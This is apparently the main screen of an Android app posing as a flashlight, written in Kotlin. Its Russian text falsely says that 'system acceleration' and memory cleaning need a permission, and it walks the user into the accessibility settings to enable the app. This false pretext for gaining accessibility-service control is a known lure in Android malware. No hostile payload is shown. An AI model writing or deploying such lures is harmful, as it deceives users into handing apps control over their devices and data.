package com.example.flashlight

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.graphics.Color

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.setPadding(50, 100, 50, 50)
        
        val title = TextView(this)
        title.text = "Ускорение системы"
        title.textSize = 24f
        title.setTextColor(Color.BLACK)
        layout.addView(title)
        
        val desc = TextView(this)
        desc.text = "\nДля ускорения работы и очистки памяти нам нужно разрешение на управление.\n\nНажмите кнопку ниже, найдите 'Фонарик' в списке и включите его."
        desc.textSize = 16f
        desc.setTextColor(Color.GRAY)
        layout.addView(desc)
        
        val btn = Button(this)
        btn.text = "Включить ускорение"
        btn.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        
        layout.addView(btn)
        setContentView(layout)
    }
}
